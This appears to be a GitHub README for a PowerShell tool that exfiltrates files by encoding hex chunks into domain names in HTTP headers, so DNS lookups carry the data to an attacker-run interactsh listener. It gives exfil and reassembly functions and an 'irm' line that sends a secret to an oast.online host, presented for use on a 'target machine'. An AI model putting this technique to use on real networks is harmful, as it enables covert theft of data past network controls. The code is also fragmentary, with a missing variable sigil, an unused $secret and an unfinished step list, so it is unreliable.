# Data Bouncing - PowerShell Version

## Overview
Data Bouncing is a technique used to transmit data between two endpoints using DNS lookups and HTTP header manipulation. This PowerShell version of the project encapsulates the core functionalities of data bouncing, including reconnaissance, data exfiltration, and file reassembly.

### Background
This project is a proof of concept (PoC) based on ideas by John and Dave, detailed at [The Contractor](https://thecontractor.io/DataBouncing). It demonstrates how to use DNS queries and HTTP headers for discreet data transfer.

## Components
The PowerShell project consists of two main scripts:

- `exfil.ps1`: Handles the exfiltration of data.
- `recreate.ps1`: Manages the reassembly of the exfiltrated data.

### `exfil.ps1`
This script encodes a file into hexadecimal format, splits it into chunks, and then sends each chunk as part of a domain name in an HTTP request header. This process helps in exfiltrating data from networks where direct transfer methods are restricted.

### `recreate.ps1`
It processes the data received from the `exfil.ps1` script. This includes finding specific patterns in logs, assembling data chunks, and converting hexadecimal data back to its original form.

## Usage
### Prerequisites
- A controlled DNS server is required.
- For hobbyist or learning purposes, [InteractSh](https://github.com/projectdiscovery/interactsh) is recommended.

### Running the Scripts
1. **Data Exfiltration**:
   ```powershell
   exfil -regex 'your-regex' -domain 'your-domain.oast.online' -url 'target-url.com' -filepath '.\path\to\file.txt'


You have two options. 
Use the [InteractSh Web Client](https://app.interactsh.com/#/) or 
use this [Build Script](https://github.com/Unit-259/DataBouncing/blob/main/Resources/interactshBuild.sh) with an Ubuntu 22.04 image.

Run this command on your listener machine to start the InteractSh Client and define your log file

```
interactsh-client -v -o /root/DataBouncing/logs.txt
```

Next on the target machine you are going to want to convert a file to Hex and prepare it for transfer with this script:
[chunks](https://github.com/Unit-259/DataBouncing/blob/main/Client/Convert-FileToHexChunks.ps1)



```powershell

function exfil {
    param (
        [string]regex,
        [string]$domain,
        [string]$url,
        [string]$filepath
    )
    $segments = Convert-FileToHexChunks -FilePath $filepath
    foreach ($segment in $segments.PSObject.Properties) {
        $secret = $segment.Value;
        send-customRequest -Url "$regex.$url" -Domain "$domain"    
    }
}
```





```
function Demo-Secrets {
    param (
        [string]$xregex,
        [string]$urlSuffix
    )

    foreach ($segment in $segments.PSObject.Properties) {
        $secret = $segment.Value
        $url = "$xregex.$secret.$urlSuffix"
        Send-CustomRequest $url
    }
}
```

```
irm "xregex.$secret.cln0jgqilvdjjg1nk8d0ksttdzkd7waij.oast.online"
```



```
Convert-hexToAscii (find-secret -FilePath ./logs.txt -XRegex 'xregex')
```

```
# 1. Convert File to hex 
# 2. segment with numbers 
# 3. 
```
